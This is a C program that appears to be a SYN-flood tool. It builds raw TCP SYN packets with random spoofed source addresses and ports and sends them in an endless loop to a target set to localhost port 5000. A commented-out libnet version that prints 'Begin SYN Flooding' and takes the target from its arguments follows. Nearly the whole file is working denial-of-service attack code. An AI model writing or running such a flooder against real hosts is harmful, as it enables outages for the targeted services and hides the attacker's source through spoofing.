#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "header.h"

#define DEST_IP "127.0.0.1"
#define DEST_PORT 5000 //set the destination port here

#define PACKET_SIZE (sizeof(struct iphdr) + sizeof(struct tcphdr))

const char dest_ip[] = DEST_IP;

// Do not forget to free address after use.
int get_address(char* host, char* port, struct addrinfo** address) {
    // Determining host
    // We want to send with UDP, IPv4 or IPv6
    struct addrinfo hints;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_protocol = 0;

    int err = getaddrinfo(host, port, &hints, address);

    if (err) {
        fprintf(stderr, "Could not get address. Error %d : %s\n", err, strerror(errno));
        return 0;
    }

    return 1;
}

void fill_packet_random(void* packet) {
	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	struct pseudo_header psh; //pseudo header

    u_int32_t s_addr = rand();
    u_int16_t s_port = rand();

	iph->tos = 0;
	iph->tot_len = sizeof(struct tcphdr);
	iph->id = 0;
	iph->frag_off = 0;
	iph->version = 4;
	iph->ihl = 5;
	iph->ttl = ~0;
	iph->protocol = 6;
	iph->check = htons(checksum(iph, 9));
    iph->saddr = s_addr;
	inet_pton(AF_INET, dest_ip, &iph->daddr);

	//fill the TCP header

    tcph->source = s_port;
    tcph->dest = htons(DEST_PORT);
    tcph->seq = rand();
    tcph-> ack_seq = rand();
    tcph-> res1 = 0;
    tcph-> doff = 5;
    tcph-> fin = 0;
    tcph-> syn = 1;
    tcph-> rst = 0;
    tcph-> psh = 0;
    tcph-> ack = 0;
    tcph-> urg = 0;
    tcph-> res2 = 0;
    tcph-> window = htons (5840);	/* maximum allowed window size */
    tcph-> check = 0;
    tcph-> urg_ptr = 0;
	

	// fill pseudo header
    psh.source_address = s_addr;
	inet_pton(AF_INET, dest_ip, &psh.dest_address);
	psh.placeholder = 0;
	psh.protocol = 6;
	psh.length = htons(sizeof(struct tcphdr));

	// set data for checksum of tcp packet
	int virtual_udp_packet_size = sizeof(struct tcphdr) + sizeof(struct pseudo_header);
	char header_data[virtual_udp_packet_size];
	memcpy(header_data, &psh, sizeof(struct pseudo_header));
	memcpy(header_data + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
	//memcpy(header_data + sizeof(struct pseudo_header) + sizeof(struct tcphdr), data, sizeof(TEST_STRING));
	tcph->check = (checksum(&header_data, virtual_udp_packet_size));

    struct in_addr ip_addr;
    ip_addr.s_addr = s_addr;
    //printf("Constructed packet from %s port %d\n", inet_ntoa(ip_addr), s_port);
}


int main(int argc, char *argv[])
{
    srand(time(0));

	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

    // just useful for sendto function
    struct addrinfo* addr;
	char port[10];
	sprintf(port, "%d", DEST_PORT);
	if(!get_address(dest_ip, port, &addr)){
		fprintf(stderr, "Could not construct ip address.\n");
        return 1;
	}

	char packet[PACKET_SIZE];
	memset(packet, 0, PACKET_SIZE);

    while(1) {
        fill_packet_random(packet);
        if(sendto(fd, packet, PACKET_SIZE,
			 0, addr->ai_addr, addr->ai_addrlen) == -1) {
		    fprintf(stderr, "Could not send data : %s\n", strerror(errno));
            return 1;
	    }
        /*
        for(int i = 0; i < PACKET_SIZE; i++) {
            printf("%x ", packet[i]);
            if (i % 8 == 7) printf("\n");
        }
        printf("\n");
        */
    }    

	return 0;

}






/*
typedef unsigned long u_long;
typedef unsigned short u_short;
typedef unsigned char u_char;

char* print_ip(u_long *ip_addr) {
    return inet_ntoa(*((struct in_addr *)ip_addr));
}

int main(int argc, char** argv) {
    u_long dest_ip;
    u_short dest_port;
    u_char err[LIBNET_ERRBUF_SIZE], *packet;
    int opt, network, byte_count, packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    if (argc < 3) {
        printf("no\n");
        return 1;
    }

    dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);
    dest_port = (u_short)atoi(argv[2]);

    network = libnet_open_raw_sock(IPPROTO_RAW);
    if (network == -1) {
        printf("run as root\n");
        return 1;
    }

    libnet_init_packet(packet_size, &packet);
    if (packet == NULL) {
        printf("memory no good\n");
        return 1;
    }

    //libnet_seed_prand();

    printf("Begin SYN Flooding of port %d on %s...\n", dest_port, print_ip(&dest_ip));

    while(1) {
        libnet_build_ip(LIBNET_TCP_H, IPTOS_LOWDELAY, libnet_get_prand(LIBNET_PRu16),
        0, libnet_get_prand(LIBNET_PR8), IPPROTO_TCP, libnet_get_prand(LIBNET_PRu32),
        dest_ip, NULL, 0, packet);

        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), dest_port, libnet_get_prand(LIBNET_PRu32),
        libent_get_prand(LIBNET_PRu32), TH_SYN, libnet_get_prand(LIBNET_PRu16), 0, 
        0, NULL, 0, packet + LIBNET_IPV4_H);



    }

}*/